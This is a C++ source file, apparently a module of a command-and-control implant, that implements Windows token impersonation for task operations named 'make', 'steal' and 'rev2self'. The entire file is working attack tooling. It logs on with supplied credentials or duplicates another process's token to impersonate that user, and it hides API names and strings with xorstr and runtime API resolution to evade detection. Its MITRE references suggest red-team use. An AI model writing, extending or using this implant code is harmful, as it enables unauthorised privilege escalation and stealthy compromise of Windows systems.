// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32

#include <Windows.h>

#include <string>

#include "agent/commands/exec/token.h"
#include "agent/util/api_resolver.h"
#include "xorstr/xorstr.hpp"

// Ref: MITRE T1134.001 (Token Impersonation/Theft)
// https://attack.mitre.org/techniques/T1134/001/
// Ref: Detection Strategy DET0482
// https://attack.mitre.org/detectionstrategies/DET0482/
//
// Operations
//   make     — LogonUserA creates a primary token for the supplied credentials; the token is
//              then attached to the calling thread with ImpersonateLoggedOnUser.
//   steal    — OpenProcessToken + DuplicateToken(SecurityImpersonation) on the target PID,
//              then ImpersonateLoggedOnUser on the duplicate.
//   rev2self — RevertToSelf, dropping the impersonation and releasing the retained token.
//
// The impersonation token must stay open for as long as the impersonation is active, so it is
// retained (process lifetime) and only released by rev2self or by the next successful
// make/steal, which replaces it.

namespace agent::commands::exec {

    namespace {

        /// Token handle backing the currently active impersonation. Retained for the process
        /// lifetime because RevertToSelf fails once the impersonation token has been closed.
        HANDLE active_token = nullptr;  // retained for the lifetime of the impersonation

        /// Releases the retained impersonation token, if any.
        void ReleaseActiveToken(decltype(&CloseHandle) close_handle) {
            if (active_token != nullptr && close_handle != nullptr) {
                close_handle(active_token);
            }
            active_token = nullptr;
        }

    }  // namespace

    CommandResult TokenImpersonate(const models::CheckinResponse& task) {
        const HMODULE advapi32 = agent::util::get_module(xorstr_("advapi32.dll"));
        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto open_process_token =
            agent::util::resolve_api<decltype(&OpenProcessToken)>(advapi32, xorstr_("OpenProcessToken"));
        const auto duplicate_token =
            agent::util::resolve_api<decltype(&DuplicateToken)>(advapi32, xorstr_("DuplicateToken"));
        const auto impersonate_logged_on_user =
            agent::util::resolve_api<decltype(&ImpersonateLoggedOnUser)>(advapi32, xorstr_("ImpersonateLoggedOnUser"));
        const auto revert_to_self =
            agent::util::resolve_api<decltype(&RevertToSelf)>(advapi32, xorstr_("RevertToSelf"));
        const auto logon_user = agent::util::resolve_api<decltype(&LogonUserA)>(advapi32, xorstr_("LogonUserA"));
        const auto open_process = agent::util::resolve_api<decltype(&OpenProcess)>(kernel32, xorstr_("OpenProcess"));
        const auto close_handle = agent::util::resolve_api<decltype(&CloseHandle)>(kernel32, xorstr_("CloseHandle"));

        if (task.operation == xorstr_("make")) {
            // Credentials come from the TokenDTO (Username/Password); the interpreter-packed
            // Commandlet/Arguements pair is accepted as a fallback.
            const std::string user = task.username.empty() ? task.command.commandlet : task.username;
            const std::string password = task.password.empty() ? task.command.arguments : task.password;
            if (user.empty() || password.empty()) {
                return CommandResult::Error(xorstr_("Token creation requires credentials"));
            }

            HANDLE token = nullptr;
            const BOOL logged_on = logon_user(user.c_str(), nullptr, password.c_str(), LOGON32_LOGON_INTERACTIVE,
                                              LOGON32_PROVIDER_DEFAULT, &token);
            if (!logged_on || token == nullptr) {
                return CommandResult::Error(xorstr_("Failed to create token"));
            }

            if (!impersonate_logged_on_user(token)) {
                close_handle(token);
                return CommandResult::Error(xorstr_("Failed to impersonate created token"));
            }

            // Impersonated successfully: keep the token open, replacing any previous one.
            ReleaseActiveToken(close_handle);
            active_token = token;
            return CommandResult::Ok(xorstr_("Token created and impersonated"));
        }

        if (task.operation == xorstr_("steal")) {
            if (task.pid <= 0) {
                return CommandResult::Error(xorstr_("Invalid target PID"));
            }

            // PROCESS_QUERY_LIMITED_INFORMATION is enough for token theft and is granted in more
            // cases than PROCESS_QUERY_INFORMATION, so try it first and fall back.
            HANDLE process = open_process(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, static_cast<DWORD>(task.pid));
            if (process == nullptr) {
                process = open_process(PROCESS_QUERY_INFORMATION, FALSE, static_cast<DWORD>(task.pid));
            }
            if (process == nullptr) {
                return CommandResult::Error(xorstr_("Failed to open process"));
            }

            HANDLE token = nullptr;
            if (!open_process_token(process, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &token)) {
                close_handle(process);
                return CommandResult::Error(xorstr_("Failed to open process token"));
            }
            close_handle(process);

            HANDLE duplicate = nullptr;
            if (!duplicate_token(token, SecurityImpersonation, &duplicate)) {
                close_handle(token);
                return CommandResult::Error(xorstr_("Failed to duplicate token"));
            }
            close_handle(token);

            if (!impersonate_logged_on_user(duplicate)) {
                close_handle(duplicate);
                return CommandResult::Error(xorstr_("Failed to impersonate stolen token"));
            }

            ReleaseActiveToken(close_handle);
            active_token = duplicate;
            return CommandResult::Ok(xorstr_("Impersonation successful"));
        }

        if (task.operation == xorstr_("rev2self")) {
            const bool reverted = revert_to_self() != FALSE;
            // RevertToSelf releases the thread impersonation; the retained token handle can now
            // be closed safely.
            ReleaseActiveToken(close_handle);
            return reverted ? CommandResult::Ok(xorstr_("Reverted to self"))
                            : CommandResult::Error(xorstr_("Failed to revert to self"));
        }

        return CommandResult::Error(xorstr_("Unknown token operation"));
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
// ========================================== { END OF FILE } ========================================== //
